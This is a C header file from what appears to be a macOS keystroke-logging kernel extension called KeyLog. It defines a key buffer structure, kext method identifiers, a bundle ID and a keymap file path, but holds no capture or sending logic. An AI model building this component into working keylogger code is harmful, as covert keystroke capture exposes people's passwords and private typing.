//
//  KeyLogCommon.h
//  KeyLog
//
//  Created by WangYongChun on 1/9/14.
//
//

#ifndef KeyLog_KeyLogCommon_h
#define KeyLog_KeyLogCommon_h


#define MAX_BUFF_SIZE 1024

typedef struct {
	unsigned char buffer[MAX_BUFF_SIZE];
	unsigned int bufLen;
} bufferStruct;

enum {
	klogKextBuffandKeys,
	klogKextBuffer,
	kNumlogKextMethods
};


#define PREF_DOMAIN		 	 CFSTR("com.prebeg.KeyLog")
#define KEXT_ID				"com.prebeg.kext.KeyLog"
#define KEYMAP_PATH			"/Library/Application Support/KeyLog/KeyLogTransferKeymap.plist"
//#define DEBUG


#endif
